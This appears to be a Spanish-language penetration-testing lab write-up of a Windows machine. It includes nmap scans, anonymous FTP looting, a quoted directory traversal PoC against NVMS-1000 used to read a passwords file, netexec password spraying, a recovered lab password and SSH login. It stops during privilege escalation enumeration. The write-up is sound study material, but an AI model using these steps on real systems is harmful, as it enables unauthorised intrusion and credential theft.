#CPTS 

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.52.243 -oG allPorts 
```

```shell
nmap -p21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 -sCV -vvv 10.129.52.243 -oN targeted
```

```shell
whatweb http://10.129.52.243
```

En la salida del [[NMAP]] observamos que esta permitido el FTP Anonymous
```shell
ftp 10.129.52.243
```

Ubicamos un directorio *Users* en el cual hay dos directorios *Nadine* y *Nathan*
Nos encontramos en el usuario *Nadine* un archivo llamado `Confidential.txt` y en el de *Nathan* `Notes to do.txt` nos los descargamos con el comando `get`

En el archivo `Confidential.txt` nos indica que se ha almacenado la contraseña del usuario *Nathan* en su escritorio en un archivo llamado `Passwords.txt` lo que nos indica que al ser una maquina Windows el archivo con la contraseña del usuario debe de estar en `C:\User\Nathan\Desktop\Passwords.txt`

En el archivo `Notes to do.txt` encontramos lo siguiente
```txt
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

Sin encontrar nada relevante

A continuación accedernos a la web que se alberga en el puerto *80*
![[Pasted image 20260902213343.png]]

Viendo que la web tiene el nombre de *NVMS-1000* lo mismo a lo que se referencia *Nathan* con el cambio de contraseña que debe de realizar, buscando en internet descubrimos que es un software de gestión y monitoreo para sistemas de videovigilancia en red *(CCTV)*

Buscaremos además las credenciales por defecto de este software por si son validas para acceder a el, no son validas, así que ahora investigaremos sobre vulnerabilidades que haya tenido esta herramienta.
Podemos buscar información en internet o usando [[SEARCHSPLOIT]]
```shell
searchsploit nvms 1000
```

Encontrando dos vulnerabilidades de *Directory Path Traversal*, veremos el contenido del archivo de como funciona la vulnerabilidad
```shell
searchsploit -x hardware/webapps/47774.txt
```

```txt
POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

Vemos que podemos listar contenidos que queramos de la maquina victima retrocediendo directorios para atrás, nos abriremos el [[BURPSUITE]] para ejecutar la explotación

En el *POC* nos dice que deberemos de modificar la petición *GET* apuntando a otro directorio de la maquia Windows, capturaremos la petición de reload de la pagina, obteniendo el *GET* inicial
![[Pasted image 20260902215201.png]]

Ahora tendremos que modificar la petición y apuntar a un directorio de la maquina Windows![[Pasted image 20260902215316.png]]

Pudiendo apuntar ahora a directorios internos de la maquina, probaremos a apuntar al `/etc/hosts` de la maquina Windows la cual la ruta es `\Windows\System32\drivers\etc\hosts`
![[Pasted image 20260902215622.png]]

Obteniendo como respuesta el archivo de `/etc/hosts` de la maquina Windows
También podemos apuntar al archivo de `Passwords.txt` que se encontraba en el directorio de *Nathan*, encontrando una lista de contraseñas
![[Pasted image 20260902215838.png]]

Las cuales nos las copiaremos en un archivo de contraseñas, ahora validaremos cual contraseña es valida para que usuario usando [[NETEXEC]]
```shell
nxc smb 10.129.52.243 -u users -p passwords --continue-on-success
```

Encontrando la combinación de usuario y contraseña
```ad-hint
Nadine:L1k3B1gBut7s@W0rk
```
Validaremos que las credenciales son validas
```shell
nxc smb 10.129.52.243 -u Nadine -p L1k3B1gBut7s@W0rk
```

Y validaremos si nos sirven para acceder via *SSH*
```shell
nxc ssh 10.129.52.243 -u 'Nadine' -p 'L1k3B1gBut7s@W0rk'
```

Accederemos via *SSH*
```shell
ssh 10.129.52.243 -l 'Nadine'
```

Buscaremos la forma para enumerar privilegios ya que hemos obtenido la primera flag como el user *Nadine*
## Local Privilege Escalation
Enumeraremos los privilegios que tenemos como el usuario
```shell
whoami /priv
```

Sin encontrar ningún privilegio fuera de lo común, también enumeramos los *Grupos* a los que pertenece el usuario
```shell
net user nadine
```

En el directorio `C:` encontramos un directorio llamado `RecData`
En el cual encontramos dos archivos `RecordInfoDB.db3` y `RecordInfoDB.db3-journal`






